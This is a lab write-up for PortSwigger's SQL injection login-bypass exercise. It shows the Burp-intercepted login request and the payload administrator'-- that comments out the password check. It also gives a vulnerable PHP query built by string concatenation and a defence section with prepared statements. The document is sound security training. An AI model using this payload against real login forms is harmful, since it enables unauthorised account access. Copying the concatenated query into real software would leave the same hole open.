# 📘 PortSwigger Lab: SQL injection vulnerability allowing login bypass

<a id="top"></a>

> 🔗 Lab: https://portswigger.net/web-security/sql-injection/lab-login-bypass

---

# 📑 Table of Contents

- [🎯 Goal](#goal)
- [🧠 Attack idea](#idea)
- [🏗 How login works](#how)
- [🔍 Step 1 — Intercept the request](#step1)
- [🔍 Step 2 — Analyze SQL](#step2)
- [🔍 Step 3 — SQL Injection](#step3)
- [🔍 Step 4 — Login bypass](#step4)
- [💥 Why the attack worked](#why)
- [🛡 Defense](#defense)
- [🛠 Checklist](#checklist)

---

<a id="goal"></a>

# 🎯 Goal

Log in as `administrator` without knowing the password using SQL Injection.

---

<a id="idea"></a>

# 🧠 Attack idea

The application inserts user input directly into SQL.

We are not guessing the password.  
We are changing SQL logic so the password check is ignored.

---

<a id="how"></a>

# 🏗 How login works

Backend likely builds:

```sql
SELECT * FROM users WHERE username='administrator' AND password='secret'
```

The condition:

```sql
AND password='secret'
```

checks the password.

Our goal is to remove this part.

---

<a id="step1"></a>

# 🔍 Step 1 — Intercept the request

Intercept the login request in Burp Suite:

```http
POST /login HTTP/2

username=administrator&password=test
```

Now we can modify parameters manually.

---

<a id="step2"></a>

# 🔍 Step 2 — Analyze SQL

The user controls:

```sql
'administrator'
```

and

```sql
'test'
```

If the application does not sanitize:

```sql
'
--
```

we can modify SQL syntax.

---

<a id="step3"></a>

# 🔍 Step 3 — SQL Injection

Use payload:

```sql
administrator'-- 
```

SQL becomes:

```sql
SELECT * FROM users WHERE username='administrator'-- ' AND password='test'
```

---

# What happened

```sql
--
```

commented out:

```sql
AND password='test'
```

Only this remains:

```sql
username='administrator'
```

The password is no longer checked.

---

<a id="step4"></a>

# 🔍 Step 4 — Login bypass

After the payload the server responds:

```http
HTTP/2 302 Found
Location: /my-account?id=administrator
```

This means:
- login successful;
- SQL Injection worked;
- authentication bypass succeeded.

---

<a id="why"></a>

# 💥 Why the attack worked

Because backend likely did:

```php
$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

The user could:
- close the string;
- inject a SQL comment;
- change WHERE logic.

---

<a id="defense"></a>

# 🛡 Defense

- Prepared Statements
- Parameterized Queries
- Input Validation
- Password Hashing
- Least Privilege

Safe example:

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");
```

---

<a id="checklist"></a>

# 🛠 Checklist

- [ ] login request identified
- [ ] SQL Injection found
- [ ] comment syntax tested
- [ ] login bypass performed
- [ ] redirect received
- [ ] admin session obtained

---

# ⬆ Back to top

[Return to top](#top)
